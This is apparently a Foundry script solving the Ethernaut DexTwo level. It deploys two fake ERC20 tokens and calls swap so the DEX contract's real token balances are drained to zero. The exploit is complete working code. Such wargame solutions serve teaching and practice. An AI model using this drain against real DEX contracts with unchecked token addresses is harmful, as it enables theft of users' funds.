// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";

import "openzeppelin-contracts/contracts/token/ERC20/IERC20.sol";
import "openzeppelin-contracts/contracts/token/ERC20/ERC20.sol";

/*
    This level will ask you to break DexTwo, a subtlely modified Dex contract from the previous level, in a different way.
    You need to drain all balances of token1 and token2 from the DexTwo contract to succeed in this level.
    You will still start with 10 tokens of token1 and 10 of token2. The DEX contract still starts with 100 of each token.
    Things that might help:
        How has the swap method been modified?

    Solution:
    The DexTwo contract does not check what tokens we are transferring
    We can mint fake tokens to transfer to DexTwo to get all of DexTwos tokens

    1. Mint 2 fake tokens with total supply = 2
    2. Donate 1 of each to the DexTwo contract
    3. Use swap function with the last fake tokens
    4. Swap amount = amount * toTokenBalance / fromTokenBalance
        100 = 1 * 100 / 1
 */


interface IDexTwo {
    function token1() external view returns (address);
    function token2() external view returns (address);
    function getSwapPrice(address from, address to, uint256 amount) external view returns (uint256);
    function swap(address from, address to, uint256 amount) external;
}


contract FakeToken is ERC20 {
    constructor() ERC20("Fake", "FAKE") {
        _mint(msg.sender, 2);
    }
}

contract DexAttack {
    constructor(IDexTwo dex) {
        // Get dex tokens
        IERC20 token1 = IERC20(dex.token1());
        IERC20 token2 = IERC20(dex.token2());

        // Create new fake tokens
        FakeToken myToken1 = new FakeToken();
        FakeToken myToken2 = new FakeToken();

        // Transfer fake tokens to dex
        myToken1.transfer(address(dex), 1);
        myToken2.transfer(address(dex), 1);

        // Approve dex for attack contracts fake tokens
        myToken1.approve(address(dex), 1);
        myToken2.approve(address(dex), 1);

        // Swap our fake tokens for dex real tokens
        dex.swap(address(myToken1), address(token1), 1);
        dex.swap(address(myToken2), address(token2), 1);

        // Check balance is drained
        require(token1.balanceOf(address(dex)) == 0, "dex token1 balance != 0");
        require(token2.balanceOf(address(dex)) == 0, "dex token2 balance != 0");
    }
}

contract DexTwoSolution is Script {

    IDexTwo dex = IDexTwo(0x03D7DF2057e74D672B89Ec2eb4a52F6b6497a45D);

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        new DexAttack(dex);
        vm.stopBroadcast();
    }
}